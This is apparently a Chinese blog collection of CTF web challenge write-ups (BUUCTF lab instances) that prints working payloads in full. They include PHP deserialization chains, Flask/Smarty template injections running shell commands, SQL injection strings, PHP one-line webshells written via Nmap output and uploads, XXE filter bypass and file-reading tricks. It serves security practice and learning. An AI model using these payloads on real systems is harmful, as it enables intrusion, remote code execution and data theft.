现在就要调\__get方法，当调用Test类不存在的属性时就会触发\__get方法。所以调用\__get方法就可以利用Show类的\__toString()方法，给str传入Test类，然后调source属性。source属性不存在就会调Test类的\__get方法

现在就需要调用Show类的\__toString()方法，\__toString()方法是当类被当做字符输出是调用，所以，就利用Show的__construct方法触发，把source赋值为Show类

构造payload:<code>/index.php?pop=
O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22index.php%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D
</code>

![upload successful](/images/pasted-332.png)
拿下flag

# [WesternCTF2018]shrine1

![upload successful](/images/pasted-333.png)
进入页面，查看源码

![upload successful](/images/pasted-334.png)
发现是一个python的程序，看源码app.config[‘FLAG’] = os.environ.pop(‘FLAG’)，推测{undefined{config}}可查看所有app.config内容，但是源码中有过滤

这里网上查到python的两个一些函数，比如url_for和get_flashed_messages

urrent_app意思应该是当前app，那我们就当前app下的config：

构造payload:<code>http://c4190e02-aaee-428b-a4b7-870822cccb55.node4.buuoj.cn:81/shrine/{{url_for.__globals__['current_app'].config}}</code>

![upload successful](/images/pasted-335.png)
拿下flag

# [网鼎杯 2020 朱雀组]Nmap1

![upload successful](/images/pasted-296.png)
进去是一个nmap的扫描界面，输入127.0.0.1试试

![upload successful](/images/pasted-297.png)
之前想到Nmap有一个下载扫描到本地的命令，在网上也是查到几个关于Nmap下载扫描纪录的命令
<code>
-oN (标准输出)
-oX (XML输出)
-oS (ScRipT KIdd|3 oUTpuT)
-oG (Grep输出)
-oA (输出至所有格式)
</code>

所以上传shell，构造payload:<code><?php @eval($_POST[1]); ?> -oG a.php</code>

![upload successful](/images/pasted-298.png)
发现存在过滤，尝试发现是php被过滤，所以替换payload中的php字符。

构造新的payload:<code>' <?= @eval($_POST["pd"]);?> -oG pd.phtml '</code>

![upload successful](/images/pasted-300.png)
成功上传，使用蚁剑连接，拿下flag

![upload successful](/images/pasted-301.png)

# [MRCTF2020]PYWebsite1

![upload successful](/images/pasted-336.png)
![upload successful](/images/pasted-337.png)
源码里发现/flag.php

![upload successful](/images/pasted-338.png)
访问发现一个页面，抓包看一下，这里说除了购买者和我自己，没有人可以看到flag，猜测可能会使用X-Forwarded-For信息，修改请求包

![upload successful](/images/pasted-339.png)
直接拿下flag

# [NPUCTF2020]ReadlezPHP1

![upload successful](/images/pasted-340.png)
进入页面

![upload successful](/images/pasted-341.png)
审查源码发现一个页面，

![upload successful](/images/pasted-342.png)
很明显是代码审计，构造payload:<code>O:8:"HelloPhp":2:{s:1:"a";s:16:"eval(phpinfo());";s:1:"b";s:6:"assert";}</code>

![upload successful](/images/pasted-343.png)
成功拿下flag

# [SWPU2019]Web11

![upload successful](/images/pasted-344.png)
进入页面，先把弱口令都试一遍失败，点注册，账号使用admin

![upload successful](/images/pasted-345.png)
显示已经被注册，使用之前那个欺骗，发现不行了，注册一个test进入

![upload successful](/images/pasted-346.png)
发现里面是一个广告发布系统，唯一能输入的地方就是广告位

![upload successful](/images/pasted-347.png)
发现有敏感词过滤，使用过滤：空格我们可以用/**/来代替，order by可以用group by来代替，注释符可以用’来闭合。

![upload successful](/images/pasted-348.png)
发现到23时候报错了，最终语句：<code>-1'/\*\*/group/\*\*/by/\*\*/23,'abc</code>

构造sql语句找回显点：<code>-1'union/\*\*/select/\*\*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'abc</code>

![upload successful](/images/pasted-349.png)
找出回显点，继续看一下数据库版本：<code>-1'union/\*\*/select/\*\*/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'abc</code>

![upload successful](/images/pasted-350.png)
发现是MariaDB，不太熟悉，先继续爆库：<code>1'/\*\*/union/\*\*/select/\*\*/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'</code>

![upload successful](/images/pasted-351.png)
库名web1，爆表发现information_schema.tables被过滤，找到两种方法绕过：
<code>
mysql.innodb_table_stats
sys.schema_auto_increment_columns
</code>

使用：<code>1'/\*\*/union/\*\*/select/\*\*/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/\*\*/from/\*\*/mysql.innodb_table_stats/\*\*/where/\*\*/database_name="web1"'
</code>

![upload successful](/images/pasted-352.png)
爆出表	ads,users。但是爆列时，显示column_name为未知列，这里在CSDN上搜索发现需要用"无列名爆值"。

这里记录一下：
<code>
普通的sq查询
select \* from users
查询表，并把列名替换为1，2，3，4，5，6
select 1,2,3,4,5 ,6union select \* from users
单独把第四列提出来，(select 1,2,3,4,5,6 union select * from users)a给查询结果命名
 select `4` from (select 1,2,3,4,5,6 union select \* from users)a;
若反引号被过滤，可以这样
select b from (select 1,2,3 as b,4,5 union select \* from users)a;
</code>

故此题最终payload：<code>-1'union/\*\*/select/\*\*/1, (select/\*\*/group_concat(b)/\*\*/from(select/\*\*/1,2,3/\*\*/as/\*\*/b/\*\*/union/\*\*/select\*from/\*\*/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 </code>

![upload successful](/images/pasted-353.png)
拿下flag！

# [CISCN2019 华东南赛区]Web111

![upload successful](/images/pasted-354.png)
一进去猜测跟以前一样，还是先要把XFF改成127.0.0.1，抓包看下

![upload successful](/images/pasted-355.png)
不知道为什么报错了，看了一下CSDN，确实是XFF，是smart ssti，之前记的命令用不了，学几个新的。使用<code>5{\*comment\*}5</code>

![upload successful](/images/pasted-356.png)
Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令，那么我们可以使用{php}{/php}标签来构造payload，但是本题会报错。

可以用{$smarty.version}来看一下版本。

![upload successful](/images/pasted-357.png)
版本号为3.1.30，看一下CSDN的回答：<code>
虽然php标签不能用，但是还有个{if}标签。
Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。
每个{if}必须有一个配对的{/if}. 也可以使用{else} 和 {elseif}. 全部的PHP条件表达式和函数都可以在if内使用，如\*||\*,or,&&,and,is_array(), 等等
</code>

使用<code>{if phpinfo()}{/if}</code>打开phpinfo

![upload successful](/images/pasted-358.png)
构造最终payload:<code>X-Forwarded-For:{if system('cat /flag')}{/if}</code>

![upload successful](/images/pasted-359.png)
拿下flag！

# [极客大挑战 2019]FinalSQL1

![upload successful](/images/pasted-360.png)
进入把每一个都点了一遍，没有什么可用信息

![upload successful](/images/pasted-361.png)
注意到?id=1，跑了下sqlmap没跑出来，看了大佬的wp，在这注入，而且还时异或盲注。

异或盲注原理:<code>
1^1返回0
1^0返回1
</code>
用大佬写的脚本跑吧

![upload successful](/images/pasted-364.png)
拿下flag
# [BSidesCF 2019]Futurella1

![upload successful](/images/pasted-365.png)
点看源码看看。

![upload successful](/images/pasted-366.png)
WTF，直接找到flag，提交发现是正确flag！

# [BSidesCF 2019]Kookie1

![upload successful](/images/pasted-367.png)
一个登录页面，注意到有cookie字样，抓包看看

![upload successful](/images/pasted-368.png)
添加cookie参数，放行

![upload successful](/images/pasted-369.png)
拿下flag

# [SUCTF 2019]Pythonginx1

![upload successful](/images/pasted-370.png)
发现还是不能直接搜flag，有过滤

![upload successful](/images/pasted-371.png)
整理源码，审查。看CSDN上一个大佬写的最简单方法：

利用了urlsplit不处理NFKC标准化：<code>/getUrl?url=file:////suctf.cc/etc/passwd</code>

![upload successful](/images/pasted-372.png)
直接获取到所有目录

记个笔记：
<code>
Nginx 重要文件目录
配置文件存放目录：/etc/nginx
主要配置文件：/etc/nginx/conf/nginx.conf
管理脚本：/usr/lib64/systemd/system/nginx.service
模块：/usr/lisb64/nginx/modules
应用程序：/usr/sbin/nginx
程序默认存放位置：/usr/share/nginx/html
日志默认存放位置：/var/log/nginx
Nginx配置文件：/usr/local/nginx/conf/nginx.conf
</code>
传参：<code>getUrl?url=file:////suctf.cc/usr/local/nginx/conf/nginx.conf</code>

![upload successful](/images/pasted-373.png)
这里拿到flag的地址，直接传参读取：<code>/getUrl?url=file:////suctf.cc/usr/fffffflag</code>

![upload successful](/images/pasted-374.png)
拿下flag

# [极客大挑战 2019]RCE ME1（\*）

![upload successful](/images/pasted-375.png)
打开题目得到，是个代码审计题目，传入的code参数不能大于40，不能是A-Z,a-z,1-10

看下别人的博客，发现可以采用异或和取反，都没听过，使用大佬的代码构造phpinfo如下

![upload successful](/images/pasted-376.png)
得到取反的payload:`?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6);`

![upload successful](/images/pasted-377.png)
蚁剑连接，发现flag里面为空，readflag为乱码

![upload successful](/images/pasted-378.png)
发现一个插件可以绕过

![upload successful](/images/pasted-379.png)
得到flag

# [WUSTCTF2020]颜值成绩查询1

进入发现是一个搜索框

![upload successful](/images/pasted-380.png)
输入50，发现提交参数为`?stunum=50`，猜测存在布尔注入，使用上次的脚本直接跑出来flag

![upload successful](/images/pasted-381.png)
得到flag

# [FBCTF2019]RCEService1

![upload successful](/images/pasted-382.png)

![upload successful](/images/pasted-383.png)
ls被过滤，根据网上的源码泄露，preg_match()函数只能匹配第一行数据，可使用`%0A`绕过

![upload successful](/images/pasted-437.png)

![upload successful](/images/pasted-384.png)
拿到目录，发现cat不能用

![upload successful](/images/pasted-436.png)

![upload successful](/images/pasted-385.png)
拿下flag

# [Zer0pts2020]Can you guess it?1

![upload successful](/images/pasted-387.png)
进入页面，没什么明显提示，打开源码

![upload successful](/images/pasted-386.png)
发现一个目录，打开

![upload successful](/images/pasted-388.png)
关键信息，可以看到有一个随机数，如果能够破解随机数就能得到flag

![upload successful](/images/pasted-389.png)
之前遇到过，可以用%0d来污染绕过，这样仍然访问得到index.php

payload:<code>/index.php/config.php/%0d</code>

![upload successful](/images/pasted-390.png)
利用:<code>
var_dump(basename("xffconfig.php")); // => config.php
var_dump(basename("config.php/xff")); // => config.php
</code>
构造payload:<code>/index.php/config.php/%ff?source</code>

![upload successful](/images/pasted-391.png)
拿到flag

# [CISCN2019 华北赛区 Day1 Web2]ikun1

![upload successful](/images/pasted-392.png)
进入页面，根据提示，可能是要买lv6账号，注册一个admin123，登录

![upload successful](/images/pasted-393.png)
存款很多，找一下lv6，，，好多页，用网上一个脚本

![upload successful](/images/pasted-394.png)
通过py脚本，发现在181页

![upload successful](/images/pasted-395.png)
发现我们的钱有点不够，抓包试试

![upload successful](/images/pasted-396.png)
修改折扣信息，成功获得一个目录

![upload successful](/images/pasted-397.png)
提示只能是admin访问。查找页面cookie信息

![upload successful](/images/pasted-398.png)
抓取访问的数据包，发现其中存在和身份认证有关的jwt，对jwt进行密匙爆破，成功获得密匙：1Kun

![upload successful](/images/pasted-400.png)

![upload successful](/images/pasted-401.png)
拿下flag

# [CSCCTF 2019 Qual]FlaskLight1

![upload successful](/images/pasted-402.png)
查看源码

![upload successful](/images/pasted-403.png)
尝试url:http://61bc57dc-d4d3-4036-96e3-e61cfee053d5.node4.buuoj.cn:81/?search={{1*9}}

![upload successful](/images/pasted-404.png)
返回9，存在ssti模板注入

payload:<code>?search={{''.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()\[258\]('ls',shell=True,stdout=-1).communicate()[0].strip()}}</code>

![upload successful](/images/pasted-405.png)
payload:<code>/?search={{''.\_\_class\_\_.\_\_mro\_\_\[2\].\_\_subclasses\_\_()\[258\]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()\[0\].strip()}}
</code>

![upload successful](/images/pasted-406.png)
拿到flag

# [NCTF2019]True XML cookbook1（*）

![upload successful](/images/pasted-407.png)
进入页面，根据题目提示，是一个XML注入

![upload successful](/images/pasted-408.png)
抓包看下

记录一些有用的路径：<code>
/etc/hosts 储存域名解析的缓存
/etc/passwd 用户密码
/proc/net/arp 每个网络接口的arp表中dev包</code>

抓包在`/proc/net/arp`发现有用信息

![upload successful](/images/pasted-409.png)

# [RCTF2015]EasySQL1

![upload successful](/images/pasted-410.png)
这里注册一个test账户登录

![upload successful](/images/pasted-411.png)
没什么重点，注册一个`admin"#,`，修改密码，成功登录admin，发现和普通人账号一样

![upload successful](/images/pasted-412.png)
既然是个注入题，那就应该是再注册那里注入

注册用户<code>123"||'</code>更改密码
![upload successful](/images/pasted-413.png)

查询库名:<code>123"||(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#</code>

![upload successful](/images/pasted-414.png)
爆表名:<code>123"||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='web_sqli')),0x7e),1))#</code>

![upload successful](/images/pasted-415.png)
爆列名:<code>123"||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),0x7e),1))#</code>

![upload successful](/images/pasted-416.png)
爆flag:<code>123"||(updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag)),0x7e),1))#</code>

![upload successful](/images/pasted-417.png)
不在这里

爆users表:<code>123"||(updatexml(1,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),1))#</code>

![upload successful](/images/pasted-418.png)
<code>
regexp 正则表达式匹配 由于报错注入的长度限制 需要使用正则表达式
那么直接去查 real_flag_1s_here 这一列 为xxxxxxxxxxxxxx
由于长度的限制导致
用正则表达式匹配 flag 可以得到一半的 flag
</code>
正序:<code>123"||(updatexml(1,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^f')),1))#</code>

![upload successful](/images/pasted-419.png)
XPATH syntax error: '{dab1d25a-0c31-4dd5-93bc-b98a31b'

逆序:<code>123"||(updatexml(1,concat('~',reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))),1))#</code>

![upload successful](/images/pasted-420.png)
XPATH syntax error: '~}9852bb13a89b-cb39-5dd4-13c0-a5'

拼接拿下flag{dab1d25a-0c31-4dd5-93bc-b98a31bb2589}

# [WUSTCTF2020]CV Maker1

![upload successful](/images/pasted-421.png)
一进去是一个注册账号的页面，正常注册一个admin@qq.com

![upload successful](/images/pasted-422.png)
发现一个文件上传，先试试php小马

![upload successful](/images/pasted-423.png)
成功上传，在新页面打开此图片并抓包

![upload successful](/images/pasted-424.png)
找到文件位置，蚁剑连接

![upload successful](/images/pasted-425.png)
![upload successful](/images/pasted-426.png)
拿下flag

# [CISCN2019 华北赛区 Day1 Web5]CyberPunk1

![upload successful](/images/pasted-427.png)
首先通过伪协议拿到以下几个文件的源码`index.php,change.php,search.php,confirm.php`

伪协议的格式如下：`php://filter/read=convert.base64-encode/resource=`

![upload successful](/images/pasted-428.png)

爆:<code>1' where user_id=updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)#</code>

![upload successful](/images/pasted-429.png)
同理爆flag：
<code>
1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)#
</code>
errorXPATH syntax error: '~flag{bad5f542-5d06-4898-80fd-1~'
![upload successful](/images/pasted-430.png)
<code>
1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),30,60)),0x7e),1)#
</code>
errorXPATH syntax error: '~16fd3b181382} ~'
![upload successful](/images/pasted-431.png)
拿到flag{bad5f542-5d06-4898-80fd-16fd3b181382}

# [红明谷CTF 2021]write_shell1

![upload successful](/images/pasted-432.png)
代码审计题，查了一下$_SERVER['REMOTE_ADDR']：指的是正在浏览当前页面用户的 IP 地址。

先`/?action=pwd`看一下

![upload successful](/images/pasted-433.png)
访问这个目录，得到所有根目录

![upload successful](/images/pasted-434.png)
找到flag所在位置

payload:<code>**/sandbox/c47b21fcf8f0bc8b3920541abd8024fd/index.php?action=upload&data=<?echo%09`cat%09/flllllll1112222222lag`?></code>
![upload successful](/images/pasted-435.png)
拿下flag

# [watevrCTF-2019]Cookie Store1

![upload successful](/images/pasted-438.png)
启动靶机，结合题目，估计需要cookie，抓包

![upload successful](/images/pasted-439.png)
对cookie进行base64解密

![upload successful](/images/pasted-440.png)

![upload successful](/images/pasted-441.png)
猜测构造cookie即可成功购买flag

![upload successful](/images/pasted-442.png)

![upload successful](/images/pasted-443.png)
成功购买到flag

# [CISCN2019 总决赛 Day2 Web1]Easyweb1

![upload successful](/images/pasted-444.png)
截屏，是个登录页面

![upload successful](/images/pasted-445.png)
查看源码，发现一个`/image.php?id=2`，发现id为1,2,3时有回显

![upload successful](/images/pasted-446.png)
sqlmap没跑出来，查看writeup为源码泄露。访问：robots.txt

![upload successful](/images/pasted-447.png)
在`/image.php.bak`下发现文件

![upload successful](/images/pasted-448.png)

<p style="color: cyan;font-size: 20px;">源码分析</p>

<li>GET方式传入变量id的值，若没有则为1</li>
<li>GET方式传入变量path的值，若没有则为空</li>
<li>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串，单引号（'）、双引号（"）、反斜杠（\）</li>
<li>str_replace()函数将两个变量内的\0、%00、\'、'都替换为空</li>
<li>将变量$id与$path拼接进SQL语句</li>

也就是说，`\\0`在传入变量$id的值后，首先被转义为`\0`，再经过`addslashes()`函数的处理，变量`$id="\\0"`，再由`str_replace()`函数的替换，最终变为`\`。

payload:`?id=\\0&path=or 1=if(length(database())>1,1,-1)%23`

![upload successful](/images/pasted-449.png)
正常回显

![upload successful](/images/pasted-450.png)
使用脚本爆出库名，判断用户信息应该在users表中，继续爆出列名：

`注：`因为过滤了`'`单、`"`双引号，所以需要将字符串转换成十六进制：`users -> 0x7573657273`

![upload successful](/images/pasted-451.png)
得到列名：`username、password`。接下来就是常规的盲注，需要获取用户名和密码：

![upload successful](/images/pasted-452.png)

![upload successful](/images/pasted-453.png)
成功得到username和password

![upload successful](/images/pasted-454.png)
成功登录

![upload successful](/images/pasted-455.png)
使用phtml成功上传，但是不知道为什么连接不上，看网上师傅的用文件名写一句话，成功上传连接，拿下flag

# [HITCON 2017]SSRFme1

![upload successful](/images/pasted-456.png)
上来就是代码审计

则目录$sandbox为sandbox/md5(orange111.73.46.229:80)即：sandbox/864300xxxxxxxxxxcc4523ef49c50223

GET ./可以查看当前路径，GET …/可以查看上一级路径，于是先：`http://0ba28389-bff6-48a1-952c-cfd44f67bfb3.node3.buuoj.cn/?url=../../../../../../&filename=aaa`

然后访问aaa：
`http://1c2ae46f-4e1e-4987-bb41-072e27d42dd7.node4.buuoj.cn:81/sandbox/2eeed2f9aeae6311b507ada8fb98809e/aaa`

![upload successful](/images/pasted-457.png)
`
首先得满足前面的文件存在, 才会继续到open语句, 所以在执行命令前得保证有相应的同名文件:
?url=&filename=bash -c /readflag| 先新建一个名为“bash -c /readflag|”的文件，用于之后的命令执行
?url=file:bash -c /readflag|&filename=aaa 再利用GET执行bash -c /readflag保存到111文件
访问sandbox/md5/aaa（得到flag）`
![upload successful](/images/pasted-458.png)
这题真的难，拿下flag，留下大佬的wp：<a href="https://blog.csdn.net/qq_45521281/article/details/105868449">perl脚本中GET命令执行漏洞（[HITCON 2017]SSRFme）</a>

# [b01lers2020]Welcome to Earth1

![upload successful](/images/pasted-459.png)
一直跳转到die页面，快速的右键看下第一页源码

![upload successful](/images/pasted-460.png)
访问`/chase/`，又是很快的跳转，拼手速看源码

![upload successful](/images/pasted-461.png)

`/leftt/`

![upload successful](/images/pasted-462.png)
终于不跳转了

![upload successful](/images/pasted-463.png)
跳来跳去也没发现有用的，看一下wp发现在`/static/js/door.js`里

![upload successful](/images/pasted-464.png)
最后来到`static/js/fight.js`

![upload successful](/images/pasted-465.png)

![upload successful](/images/pasted-466.png)
脚本排序，拿到flag

# [GYCTF2020]Ezsqli1

![upload successful](/images/pasted-467.png)
很霸气的前端

![upload successful](/images/pasted-468.png)

![upload successful](/images/pasted-469.png)
有回显

![upload successful](/images/pasted-470.png)
使用脚本拿下flag

# [NCTF2019]SQLi1

![upload successful](/images/pasted-472.png)
给出了sql查询语句:`select * from users where username='' and passwd=''`

用dirsearch发现/robots.txt页面

![upload successful](/images/pasted-473.png)
发现/hint.txt

![upload successful](/images/pasted-474.png)
发现当密码和admin密码相同时就能得到flag

![upload successful](/images/pasted-475.png)
`username=\&passwd=||1;%00`时，得到一个welcome.php

![upload successful](/images/pasted-476.png)
`username=\&passwd=||0;%00`时，无welcome.php。可以利用bool盲注进行注入，爆破passwd

payload:`username=\&passwd=||passwd/**/regexp/**/"^y";%00`

![upload successful](/images/pasted-477.png)
继续使用脚本爆破密码

![upload successful](/images/pasted-478.png)
使用任意账号和这个密码，成功登录

![upload successful](/images/pasted-479.png)
拿下flag

# [RootersCTF2019]I_<3_Flask1

这里记录arjun的使用方法`arjun -u url -c 150 -d 0.5`
<li>pip3 install arjun</li>

<li>python3 setup.py install</li>

<li>输入arjun -h显示如下即可</li>

![upload successful](/images/pasted-480.png)
扫描url得到参数是name

![upload successful](/images/pasted-481.png)
得到参数是name

![upload successful](/images/pasted-482.png)
测试发现存在SSTI模板注入

payload:`/?name={{lipsum.__globals__['os'].popen('cat flag.txt').read()}}`

![upload successful](/images/pasted-483.png)
拿到flag

# [HarekazeCTF2019]encode_and_encode1

![upload successful](/images/pasted-486.png)
点到源码里面看看

![upload successful](/images/pasted-484.png)

引用一篇CSDN的文章，这个不太理解<a href=https://blog.csdn.net/m0_62905261/article/details/125956021>[HarekazeCTF2019]encode_and_encode</a>


![upload successful](/images/pasted-488.png)
抓包传参:`{"page":"\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}`

![upload successful](/images/pasted-487.png)
base64解码拿下flag

# [网鼎杯2018]Unfinish1

![upload successful](/images/pasted-489.png)
是一个登录页面，测试了一下没发现什么，使用dirsearch扫描，发现/register.php

再次找到CSDN的解释，使用payload:`0'+ascii(substr((select * from flag) from 1 for 1))+'0`注册

![upload successful](/images/pasted-490.png)
成功获取到flag值得第一位asii：102即f，结果如上，使用py脚本

![upload successful](/images/pasted-491.png)
拿到flag

# [网鼎杯 2020 半决赛]AliceWebsite1

![upload successful](/images/pasted-492.png)
进入页面，在网址处发现`?action=`，试一下../../

![upload successful](/images/pasted-493.png)
直接拿下flag

# [HFCTF2020]JustEscape1

![upload successful](/images/pasted-494.png)
进入页面，先使用dirsearch扫一下后台

没扫到有用的，看一下wp，解释是是vm2的沙箱逃逸问题：<a href=https://github.com/patriksimek/vm2/issues/225>github上的poc</a>

payload由于本站超文本语言无法引入，<a href=https://blog.csdn.net/qq_25500649/article/details/119568880>CSDN关于这题vm2沙箱逃逸的wp</a>

![upload successful](/images/pasted-495.png)
得到flag

# [GXYCTF2019]StrongestMind1

![upload successful](/images/pasted-496.png)
这题，明显是要写个py脚本一直算，网上引用一个开始

![upload successful](/images/pasted-497.png)
得到flag

# October 2019 Twice SQL Injection1

![upload successful](/images/pasted-498.png)
题目也提醒我们是二次注入了，先注册一个admin

![upload successful](/images/pasted-499.png)
又注册了一个`666'#`账号

![upload successful](/images/pasted-500.png)
没有信息回显了，猜测sql语句可能是：`select ? from table where username='666'#'`

使用联合注入爆数据库：`2' union select database()#`

![upload successful](/images/pasted-501.png)

爆表:`666' union select group_concat(table_name)from information_schema.tables where table_schema=database()#
`
![upload successful](/images/pasted-502.png)

爆字段:`666' union select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='flag'#`

![upload successful](/images/pasted-503.png)
最后使用：`1' union select group_concat(flag) from flag#`

![upload successful](/images/pasted-504.png)
拿到flag

# [SUCTF 2018]GetShell1

![upload successful](/images/pasted-505.png)
发现文件上传，发现甚至连字母和换行都过滤了

`
<?=
$_=[];
$_=($_===$_);
$___=~区[$_].~册[$_].~区[$_].~勿[$_].~皮[$_].~针[$_];//system
$____=~研[$_].~寻[$_].~尽[$_].~欢[$_].~立[$_];//_POST
$___($$____[_]);
`

删除换行，得到：`<?=$_=[];$_=($_===$_);$___=~区[$_].~册[$_].~区[$_].~勿[$_].~皮[$_].~针[$_];$____=~研[$_].~寻[$_].~尽[$_].~欢[$_].~立[$_];$___($$____[_]);`

![upload successful](/images/pasted-506.png)
成功getshell，发现是个假flag，看wp发现在env里，执行env

![upload successful](/images/pasted-507.png)
得到flag

记录有关本题的两篇文章：
<li><a href=https://blog.csdn.net/fmyyy1/article/details/116133703>[SUCTF 2018]GetShell</a></li>
<li><a href=https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html>一些不包含数字和字母的webshell</a></li>

# [GKCTF 2021]easycms1

![upload successful](/images/pasted-508.png)
进入页面，题目提示后台是弱口令，先找一下后台

![upload successful](/images/pasted-509.png)
运气好，在/admin.php发现后台

![upload successful](/images/pasted-510.png)
弱口令尝试发现账号密码为admin/12345，根据题目这题应该和cms有关系

![upload successful](/images/pasted-513.png)
修改文件头，但是不能保存

![upload successful](/images/pasted-517.png)
先上传一个文件，然后修改名字为：`../../../../../system/tmp/vfkm`

![upload successful](/images/pasted-516.png)
成功保存

![upload successful](/images/pasted-518.png)
拿下flag

# [极客大挑战 2020]Roamphp1-Welcome1

![upload successful](/images/pasted-519.png)
进入页面，发现啥都加载不出来，看了下wp才发现是正常情况，需要修改请求方式

![upload successful](/images/pasted-520.png)
在yakit中修改为POST请求

![upload successful](/images/pasted-522.png)
成功拿到部分源码

![upload successful](/images/pasted-523.png)
源码分析：
<li>若传参方式不为`POST`，则返回`405`</li>
<li>POST方式传入参数`roam1`和`roam2`的值</li>
<li>俩变量的值不能相等，但`sha1()`加密后的值相等</li>

因为`sha1()`不能加密数组，所以构造payload：`roam1[]=1&roam2[]=2`

![upload successful](/images/pasted-524.png)
打开phpinfo

![upload successful](/images/pasted-525.png)
成功搜索到，拿到flag

# [CSAWQual 2019]Web_Unagi1

![upload successful](/images/pasted-526.png)
进入页面，发现有四个按钮

User：
![upload successful](/images/pasted-528.png)
Upload：
![upload successful](/images/pasted-530.png)
about：
![upload successful](/images/pasted-531.png)
提示 flag 在 根目录下，在upload发现文件上传

![upload successful](/images/pasted-532.png)
给出了模板，猜测为XXE

![upload successful](/images/pasted-534.png)
直接上传一个这个xml文件

![upload successful](/images/pasted-533.png)
存在WAF

<code>一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。
在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集
所以我们能利用到的编码有很多。</code>

使用命令`iconv -f utf8 -t utf-16 1.xml>2.xml`转换字符格式为utf-16

![upload successful](/images/pasted-535.png)
上传2.xml

![upload successful](/images/pasted-536.png)
拿到flag

# [WMCTF2020]Make PHP Great Again1

![upload successful](/images/pasted-537.png)
打开页面，看了下wp

这里涉及到一个知识点是（<a href=https://www.anquanke.com/post/id/213235>php源码分析 require_once 绕过不能重复包含文件的限制 - 安全客，安全资讯平台</a>）：PHP最新版的小Trick， require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含。

构造payload：`/?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php`

![upload successful](/images/pasted-538.png)
拿到flag

# [强网杯 2019]Upload1(*)

![upload successful](/images/pasted-539.png)
一个discuz论坛登录页面，先注册一个账号

![upload successful](/images/pasted-540.png)
成功登录，抓包看下

![upload successful](/images/pasted-542.png)
将cookie使用base64解密

![upload successful](/images/pasted-541.png)
得到一个序列化后的，使用dirsearch扫描，发现源码/www.tar.gz，解压后是一个tp5的框架